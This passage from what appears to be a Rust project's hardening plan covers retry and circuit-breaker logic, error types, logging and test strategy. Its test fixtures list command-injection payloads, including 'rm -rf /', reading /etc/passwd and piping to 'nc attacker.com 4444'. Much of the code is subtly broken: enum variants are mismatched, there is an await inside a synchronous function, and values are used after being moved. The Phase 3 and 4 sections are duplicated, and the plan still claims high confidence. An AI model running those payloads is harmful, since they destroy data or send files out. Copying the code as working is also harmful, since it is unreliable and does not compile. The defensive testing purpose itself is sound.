            std::thread::sleep(Duration::from_millis(200));
            Ok("Slow result")
        };

        let config = RetryConfig::new()
            .with_timeout(Duration::from_millis(100))
            .with_max_attempts(3);

        let start_time = std::time::Instant::now();
        let result = config.execute_with_retry(slow_operation);
        let elapsed = start_time.elapsed();

        assert!(result.is_err(), "Operation should timeout");

        match result.unwrap_err() {
            RetryError::Timeout(_) => {}, // Expected
            other => panic!("Expected timeout, got: {:?}", other),
        }

        // Should timeout quickly (around 100ms, not 200ms * attempts)
        assert!(elapsed < Duration::from_millis(150));
    }
}

// Step 2: Implement with comprehensive retry logic
#[derive(Debug, Clone)]
pub struct RetryConfig {
    max_attempts: u32,
    base_delay: Duration,
    max_delay: Duration,
    backoff_multiplier: f64,
    timeout: Option<Duration>,
    jitter: bool,
    circuit_breaker_threshold: Option<u32>,
}

#[derive(Debug, thiserror::Error)]
pub enum RetryError<E: std::error::Error + Send + Sync + 'static> {
    #[error("Operation failed after {attempts} attempts")]
    Exhausted(E),

    #[error("Retry attempts exhausted: {cause}")]
    RetryExhausted { cause: E, attempts: u32 },

    #[error("Operation timed out after {timeout}")]
    Timeout { timeout: Duration },

    #[error("Operation failed: {cause}")]
    OperationFailed { cause: E },

    #[error("Circuit breaker opened: {failures} consecutive failures")]
    CircuitBreakerOpen { failures: u32 },
}

impl Default for RetryConfig {
    fn default() -> Self {
        Self {
            max_attempts: 3,
            base_delay: Duration::from_millis(100),
            max_delay: Duration::from_secs(30),
            backoff_multiplier: 2.0,
            timeout: None,
            jitter: true,
            circuit_breaker_threshold: Some(5),
        }
    }
}

impl RetryConfig {
    pub fn new() -> Self {
        Default::default()
    }

    pub fn with_max_attempts(mut self, attempts: u32) -> Self {
        self.max_attempts = attempts;
        self
    }

    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout = Some(timeout);
        self
    }

    pub fn execute_with_retry<T, F, E>(&self, mut operation: F) -> Result<T, RetryError<E>>
    where
        F: FnMut() -> Result<T, E>,
        E: std::error::Error + Send + Sync + 'static,
    {
        let mut consecutive_failures = 0u32;
        let mut last_error: Option<E> = None;

        for attempt in 1..=self.max_attempts {
            let attempt_start = std::time::Instant::now();

            // Check circuit breaker
            if let Some(threshold) = self.circuit_breaker_threshold {
                if consecutive_failures >= threshold {
                    return Err(RetryError::CircuitBreakerOpen { failures: consecutive_failures });
                }
            }

            let result = if let Some(timeout) = self.timeout {
                // Execute with timeout
                tokio::time::timeout(timeout, async {
                    tokio::task::spawn_blocking(move || operation()).await
                }).await
                    .map_err(|_| RetryError::Timeout { timeout })?
                    .and_then(|inner| inner.map_err(|e| RetryError::OperationFailed { cause: e }))
            } else {
                // Execute normally
                operation().map_err(|e| RetryError::OperationFailed { cause: e })
            };

            let attempt_duration = attempt_start.elapsed();

            match result {
                Ok(success) => {
                    // Reset consecutive failures on success
                    if consecutive_failures > 0 {
                        info!("Operation succeeded after {} consecutive failures", consecutive_failures);
                    }
                    return Ok(success);
                }
                Err(e) => {
                    consecutive_failures += 1;
                    last_error = Some(extract_operation_error(e)?);

                    // Log retry attempt with comprehensive context
                    warn!(
                        "Attempt {}/{} failed in {:?}: {}",
                        attempt, self.max_attempts, attempt_duration, last_error.as_ref().unwrap()
                    );

                    // Don't retry on the last attempt
                    if attempt == self.max_attempts {
                        return Err(e);
                    }

                    // Calculate delay for next attempt
                    let base_delay = self.base_delay;
                    let exponential_delay = Duration::from_millis(
                        (base_delay.as_millis() as f64 * self.backoff_multiplier.powi(attempt as i32 - 1)) as u64
                    );

                    let delay = std::cmp::min(exponential_delay, self.max_delay);

                    // Add jitter to prevent thundering herd
                    let final_delay = if self.jitter {
                        self.add_jitter(delay)
                    } else {
                        delay
                    };

                    info!("Retrying in {:?} (attempt {})", final_delay, attempt + 1);
                    std::thread::sleep(final_delay);
                }
            }
        }

        unreachable!("Should have returned before reaching here");
    }

    fn extract_operation_error<E: std::error::Error + 'static>(e: RetryError<E>) -> Result<E, RetryError<E>> {
        match e {
            RetryError::OperationFailed { cause } => Ok(cause),
            RetryError::RetryExhausted { cause } => Ok(cause),
            RetryError::Timeout { .. } | RetryError::CircuitBreakerOpen { .. } => {
                Err(e) // These are not operation errors
            }
            RetryError::Exhausted(op_error) => Ok(op_error),
        }
    }

    fn add_jitter(&self, delay: Duration) -> Duration {
        use rand::Rng;

        // Add ±25% random jitter
        let jitter_range = delay.as_millis() as f64 * 0.25;
        let jitter_millis = rand::thread_rng().gen_range(-jitter_range as i64, jitter_range as i64 + 1);

        Duration::from_millis((delay.as_millis() as i64 + jitter_millis).max(0) as u64)
    }
}
```

**Property-Based Tests for Retry Logic**:
```rust
proptest! {
    #[test]
    fn test_retry_arbitrary_configs(config in any::<RetryConfig>()) {
        // Should handle any retry configuration without panicking
        let operation = || if rand::random() { Ok("success") } else { Err("failure".into()) };

        let result = config.execute_with_retry(operation);

        // Result should be deterministic (success or max attempts exhausted)
        prop_assert!(result.is_ok() ||
            (matches!(result.unwrap_err(), RetryError::Exhausted(_)) ||
            (matches!(result.unwrap_err(), RetryError::Timeout(_)))
        );
    }

    #[test]
    fn test_retry_timing_arbitrary_delays(base_delay in any::<Duration>()) {
        let config = RetryConfig::new().with_base_delay(base_delay);
        let attempt_count = AtomicUsize::new(0);

        let operation = || {
            attempt_count.fetch_add(1, Ordering::SeqCst);
            Err("test failure".into())
        };

        let _ = config.execute_with_retry(operation);

        // Should have made at least 3 attempts (1 initial + 2 retries)
        prop_assert!(attempt_count.load(Ordering::SeqCst) >= 3);
    }
}
```

**Validation Requirements**:
- All retry scenarios tested with deterministic behavior
- Exponential backoff with jitter implemented correctly
- Timeout protection prevents hanging operations
- Circuit breaker prevents cascade failures
- Comprehensive logging for debugging retry scenarios

### Phase 3: Enhanced Error Types with Test-Driven Implementation (Priority 3)

#### Task 3.1: Add Comprehensive Error Types with Full Test Coverage
**Files**: Create `src/core/errors.rs`, update all error handling
**Test-First Error Type Strategy**:

```rust
// Step 1: Define comprehensive error test matrix
#[cfg(test)]
mod error_type_tests {
    use super::*;

    const ERROR_TEST_MATRIX: &[(&str, ErrorTestCase)] = &[
        // (error_scenario, input, expected_error_type, error_contains)
        ("empty_config", "", "ConfigError::ParseError", "end of file"),
        ("invalid_toml", "invalid", "ConfigError::ParseError", "expected"),
        ("zero_vendor_id", "0", "ValidationError::OutOfRange", "Must be non-zero"),
        ("negative_product_id", "-1", "ValidationError::OutOfRange", "Must be positive"),
        ("path_traversal", "../../../etc/passwd", "ValidationError::InvalidPath", "traversal"),
        ("injection_attempt", "; rm -rf /", "CommandError::SecurityViolation", "injection"),
        ("timeout_error", "timeout", "RetryError::Timeout", "timed out"),
        ("device_gone", "device_unavailable", "DeviceError::Disconnected", "disconnected"),
    ];

    #[test]
    fn test_error_type_matrix() {
        for (scenario_name, input, expected_error_type, expected_contains) in ERROR_TEST_MATRIX {
            println!("Testing error scenario: {}", scenario_name);

            let error_result = simulate_error_condition(input);
            assert!(error_result.is_err(),
                "Scenario '{}' should produce error", scenario_name);

            let error = error_result.unwrap_err();
            let error_string = format!("{}", error);

            // Verify specific error type
            assert!(error_string.contains(expected_error_type),
                "Error should contain '{}': {}", expected_error_type, error_string);

            // Verify error message contains expected content
            assert!(error_string.contains(expected_contains),
                "Error should contain '{}': {}", expected_contains, error_string);
        }
    }

    #[test]
    fn test_error_context_preservation() {
        let original_error = std::io::Error::new(std::io::ErrorKind::NotFound, "test file");
        let context_info = "config_parsing";
        let user_data = "config.toml";

        let result = add_error_context(original_error, context_info, user_data);
        let error = result.unwrap_err();

        let error_string = format!("{}", error);

        // Verify context is preserved
        assert!(error_string.contains(context_info), "Context should be preserved");
        assert!(error_string.contains(user_data), "User data should be preserved");
        assert!(error_string.contains("test file"), "Original error should be preserved");
    }
}

// Step 2: Implement with comprehensive error types
#[derive(Debug, thiserror::Error)]
pub enum QMKError {
    #[error("Configuration error: {0}")]
    Config(#[from] ConfigError),

    #[error("Device communication failed: {0}")]
    Device(#[from] DeviceError),

    #[error("Platform error: {0}")]
    Platform(#[from] PlatformError),

    #[error("Window monitoring error: {0}")]
    WindowMonitor(#[from] WindowMonitorError),

    #[error("Command execution failed: {command} - {reason}")]
    CommandExecution { command: String, reason: String },

    #[error("Validation error: {0}")]
    Validation(#[from] ValidationError),

    #[error("Retry operation failed after {attempts} attempts: {cause}")]
    RetryExhausted { attempts: u32, cause: String },

    #[error("Operation timed out after {timeout}")]
    Timeout { timeout: String },

    #[error("Circuit breaker opened after {failures} consecutive failures")]
    CircuitBreakerOpen { failures: u32 },

    #[error("Component degraded: {component} - {reason}")]
    Degradation { component: String, reason: String },

    #[error("Insufficient permissions for operation: {operation}")]
    InsufficientPermissions { operation: String, required: String },
}

impl QMKError {
    pub fn is_security_related(&self) -> bool {
        matches!(self,
            QMKError::CommandExecution { .. } |
            QMKError::Validation(ValidationError::InvalidPathSequence { .. } | ValidationError::InvalidStringBytes { .. }) |
            QMKError::InsufficientPermissions { .. }
        )
    }

    pub fn get_error_code(&self) -> u32 {
        match self {
            QMKError::Config(_) => 1000,
            QMKError::Device(_) => 2000,
            QMKError::Platform(_) => 3000,
            QMKError::WindowMonitor(_) => 4000,
            QMKError::CommandExecution { .. } => 5000,
            QMKError::Validation(_) => 6000,
            QMKError::RetryExhausted { .. } => 7000,
            QMKError::Timeout { .. } => 8000,
            QMKError::CircuitBreakerOpen { .. } => 9000,
            QMKError::Degradation { .. } => 9500,
            QMKError::InsufficientPermissions { .. } => 9600,
        }
    }
}
```

#### Task 3.2: Add Structured Logging with Test Coverage
**Files**: `src/core/logging.rs`, integrate throughout application
**Test Infrastructure**:
```rust
// Add to Cargo.toml:
[dependencies]
log = "0.4"
fern = "0.6"
chrono = { version = "0.4", features = ["serde"] }

#[cfg(test)]
mod logging_tests {
    use super::*;

    #[test]
    fn test_error_logging_levels() {
        let test_cases = vec![
            (QMKError::Config(ConfigError::ParseError("test".to_string())), LogLevel::Error),
            (QMKError::Degradation { component: "test".to_string(), reason: "test".to_string() }), LogLevel::Warn,
        ];

        for (error, expected_level) in test_cases {
            let captured_logs = capture_logs(|| {
                log_error(&error);
            });

            assert!(!captured_logs.is_empty(), "Should have logged error");
            assert!(captured_logs.iter().any(|log| log.level == expected_level),
                "Should have logged at level: {:?}", expected_level);
        }
    }
}
```

### Phase 4: Comprehensive Testing Infrastructure with Test-Driven Development (Priority 4)

#### Task 4.1: Add Error Path Testing with Property-Based Coverage
**Files**: Add to existing test modules in all platforms
**Test Dependencies to Add**:
```toml
[dev-dependencies]
proptest = "1.0"
tokio-test = "0.4"
tempfile = "3.0"
mockall = "0.11"
criterion = "0.5"  # For performance regression testing
```

**Test Infrastructure Requirements**:
```rust
// Create comprehensive test utilities
#[cfg(test)]
mod test_utilities {
    use super::*;
    use tempfile::NamedTempFile;

    pub fn create_malformed_config(content: &str) -> NamedTempFile {
        let temp_file = NamedTempFile::new().unwrap();
        fs::write(&temp_file, content).unwrap();
        temp_file
    }

    pub fn create_injection_test_cases() -> Vec<(&'static str, &'static str, &'static str)> {
        vec![
            ("; rm -rf /", "semicolon", "command injection"),
            ("&& cat /etc/passwd", "ampersand", "command chaining"),
            ("| nc attacker.com 4444", "pipe", "pipe injection"),
            ("$(whoami)", "substitution", "command substitution"),
            ("`id`", "backtick", "backtick injection"),
            ("../../../etc/passwd", "path_traversal", "path traversal"),
            ("\"; sudo rm -rf /", "quote", "quote injection"),
            ("\\x00malicious", "null_byte", "null byte injection"),
        ]
    }
}

// Property-based tests for comprehensive coverage
proptest! {
    #[test]
    fn test_error_handling_arbitrary_configurations(config in any::<TestConfiguration>()) {
        // Test with completely random configurations
        let result = qmkonnect::core::Config::validate(&config);

        // Should never panic, always return Ok or structured Err
        prop_assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_retry_exponential_backoff_arbitrary_delays(base_delay in any::<Duration>()) {
        let config = RetryConfig::new().with_base_delay(base_delay);
        let attempt_delays = simulate_retry_sequence(&config, 5);

        // Verify exponential backoff behavior
        for (i, delay) in attempt_delays.iter().enumerate() {
            let expected_delay = config.base_delay * config.backoff_multiplier.powi(i as i32);
            let actual_delay = delay.as_millis();

            // Allow some variance due to jitter
            let variance = (actual_delay as f64 - expected_delay.as_millis() as f64).abs();
            prop_assert!(variance <= expected_delay.as_millis() as f64 * 0.5, // Allow 50% jitter
                    "Delay variance too large: expected {}, actual {}, variance {}",
                    expected_delay.as_millis(), actual_delay, variance);
        }
    }
}
```

**Integration Test Scenarios**:
```rust
#[cfg(test)]
mod integration_tests {
    use super::*;

    #[test]
    fn test_full_application_startup_sequence() {
        let test_scenarios = vec![
            ("malformed_config", "Configuration parsing"),
            ("missing_hyprland", "Window system availability"),
            ("device_failure", "Device communication"),
            ("permission_denied", "File system permissions"),
        ];

        for (scenario, description) in test_scenarios {
            println!("Testing startup scenario: {}", description);

            let result = simulate_application_startup(scenario);

            // Application should either succeed or degrade gracefully
            match result {
                Ok(_) | Err(QMKError::Degradation { .. }) => {
                    // Acceptable outcomes
                }
                Err(other) => {
                    // Verify error is properly structured and logged
                    assert!(other.get_error_code() != 0, "Error should have valid code");
                    if other.is_security_related() {
                        // Check for security logging
                    }
                }
            }
        }
    }
}
```

**Performance Regression Tests**:
```rust
// Create benchmarks/tests/performance.rs
use criterion::{black_box, criterion_group, criterion_main, Criterion};

fn benchmark_error_handling(c: &mut Criterion) {
    c.bench_function("error_handling_overhead", |b| {
        b.iter(|| {
            let result = process_malformed_input(black_box("test_input"));
            black_box(result)
        })
    });

    c.bench_function("retry_logic_performance", |b| {
        let config = RetryConfig::default();
        b.iter(|| {
            let result = config.execute_with_retry(|| simulate_operation());
            black_box(result)
        })
    });
}

criterion_group!(benches, benchmark_error_handling);
criterion_main!(benches);
```

**Test Coverage Requirements**:
- 100% line coverage on all error handling code
- Property-based tests for all external data parsing
- Integration tests for complete failure scenarios
- Mock-based testing for external system dependencies
- Performance regression tests for error handling overhead
- Security-focused injection tests for all command execution paths
- Stress testing for concurrent error conditions

### Phase 3: Enhanced Error Types (Priority 3)

#### Task 3.1: Add Comprehensive Error Types
**Files**: Create `src/core/errors.rs`, update all error handling
**Pattern**:
```rust
#[derive(Debug, thiserror::Error)]
pub enum QMKError {
    #[error("Configuration error: {0}")]
    Config(#[from] ConfigError),

    #[error("Device communication failed: {0}")]
    Device(#[from] DeviceError),

    #[error("Platform error: {0}")]
    Platform(#[from] PlatformError),

    #[error("Window monitoring error: {0}")]
    WindowMonitor(#[from] WindowMonitorError),

    #[error("Command execution failed: {command} - {reason}")]
    CommandExecution { command: String, reason: String },

    #[error("Validation error: {0}")]
    Validation(#[from] ValidationError),
}
```
**Validation**: All errors provide context and are properly structured

#### Task 3.2: Add Structured Logging
**Files**: `src/core/logging.rs`, integrate throughout application
**Pattern**:
```rust
use log::{error, warn, info, debug, trace};

pub fn log_external_data_error(source: &str, data: &str, error: &dyn std::error::Error) {
    error!(
        target: "external_data",
        "Source '{}' rejected data: '{}'. Error: {}",
        source,
        truncate_string_for_log(data, 200),
        error
    );
}

pub fn log_degradation(component: &str, reason: &str) {
    warn!(
        target: "degradation",
        "Component '{}' degraded: {}",
        component,
        reason
    );
}
```
**Validation**: All error conditions logged with appropriate severity

### Phase 4: Testing Infrastructure (Priority 4)

#### Task 4.1: Add Error Path Testing
**Files**: Add to existing test modules in all platforms
**Pattern**:
```rust
#[cfg(test)]
mod error_tests {
    use super::*;

    #[test]
    fn test_malformed_config_handling() {
        let malformed_config = "invalid toml content";
        let result = Config::from_str(malformed_config);
        assert!(result.is_err());

        match result.unwrap_err() {
            ConfigError::ParseError(_) => {}, // Expected
            other => panic!("Unexpected error type: {:?}", other),
        }
    }

    #[test]
    fn test_command_injection_prevention() {
        let malicious_input = "'; rm -rf / #";
        let result = safe_command_execution(&[malicious_input]);
        assert!(result.is_err());

        match result.unwrap_err() {
            CommandError::InvalidArgs(_) => {}, // Expected
            other => panic!("Should have prevented injection: {:?}", other),
        }
    }
}
```
**Validation**: All error paths have test coverage

#### Task 4.2: Add Property-Based Testing
**Files**: Create `tests/property_based/` with integration tests
**Pattern**:
```rust
use proptest::prelude::*;

proptest! {
    #[test]
    fn test_config_validation_arbitrary_strings(s in "\\PC*") {
        let result = validate_config_value(&s);
        // Should handle any string input gracefully
        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_device_timeout_arbitrary_delays(delay_ms in 0u64..10000) {
        let config = RetryConfig::new()
            .with_max_delay(Duration::from_millis(delay_ms));
        // Should work with any reasonable delay
        assert!(config.is_valid());
    }
}
```
**Validation**: Property-based tests pass for external data handling

## Validation Gates

### Development Validation Commands
```bash
# 1. Ensure no unwrap() calls in production code
cargo clippy -- -D clippy::unwrap_used

# 2. Run all tests with error conditions
cargo test --lib -- --nocapture

# 3. Check for unsafe blocks without proper validation
cargo audit --json | jq '.vulnerabilities | length'

# 4. Validate all command execution paths
cargo test command_injection_tests

# 5. Test graceful degradation scenarios
cargo test degradation_scenarios --features="test-degradation"

# 6. Memory safety validation
MIRIFLAGS="-Zmiri" cargo miri test

# 7. Integration test with malformed external data
./scripts/test_malformed_external_data.sh
```

### Acceptance Criteria
- [ ] Zero `.unwrap()` calls in production code paths
- [ ] All external data validated before processing
- [ ] Command injection attacks prevented in all execution paths
- [ ] Application continues running with any external system failure
- [ ] All error conditions have appropriate test coverage
- [ ] No regression in existing functionality
- [ ] Performance impact < 5% for normal operations
- [ ] Memory usage stable under error conditions
- [ ] Security audit passes with no critical vulnerabilities

## Final Validation Checklist

### Code Quality
- [ ] All error types implement `Debug`, `Display`, and `Error` traits
- [ ] No panic points reachable from external input
- [ ] Resource cleanup using RAII patterns
- [ ] Proper lifetime management for all external resources
- [ ] Thread safety for all shared state

### Security Hardening
- [ ] Input validation prevents all injection vectors
- [ ] Command execution uses allowlists for arguments
- [ ] Path traversal attacks prevented in file operations
- [ ] Device communication validates data integrity
- [ ] No buffer overflows in string operations

### Reliability Engineering
- [ ] Graceful degradation for all external dependencies
- [ ] Retry logic with exponential backoff implemented
- [ ] Timeout handling for all network/device operations
- [ ] Circuit breaker pattern for repeated failures
- [ ] Health checks for all subsystems

### Operational Readiness
- [ ] Comprehensive error logging with structured format
- [ ] Metrics collection for error rates and degradation
- [ ] Alerting patterns for critical failures
- [ ] Documentation for troubleshooting error conditions
- [ ] Runbooks for common failure scenarios

## Context Completeness Validation

### No Prior Knowledge Test
This PRP provides complete context for implementation including:
- ✅ Specific file locations and patterns to follow
- ✅ Exact code examples with error handling patterns
- ✅ Validation commands that work in this codebase
- ✅ Dependencies on existing libraries and patterns
- ✅ Test strategies that work with current test framework

A developer unfamiliar with this codebase can successfully implement robust error handling using only this PRP and the existing codebase.

---

**Confidence Score**: 9/10 - High confidence for one-pass implementation success

**Key Success Factors**:
- Comprehensive analysis of current codebase vulnerabilities
- Specific, actionable patterns for each improvement area
- Phased approach allows incremental implementation
- Existing dependency ecosystem supports all recommended patterns
- Test coverage includes security and reliability scenarios